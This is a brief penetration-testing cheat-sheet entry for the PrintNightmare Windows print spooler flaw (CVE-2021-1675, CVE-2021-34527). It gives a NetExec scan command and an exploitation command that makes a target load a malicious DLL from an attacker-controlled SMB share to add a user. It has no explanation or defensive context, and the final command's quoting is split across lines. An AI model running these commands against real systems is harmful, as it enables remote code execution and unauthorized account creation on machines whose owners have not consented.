# Print Nightmare
- PrintNightmare CVE-2021-1675, CVE-2021-34527
```bash


nxc smb <ip> -u 'user' -p 'pass' -M printnightmare #scan

printnightmare.py -dll '\\<attacker_ip>\smb\add_user.dll' 
'<user>:<password>@<ip>
```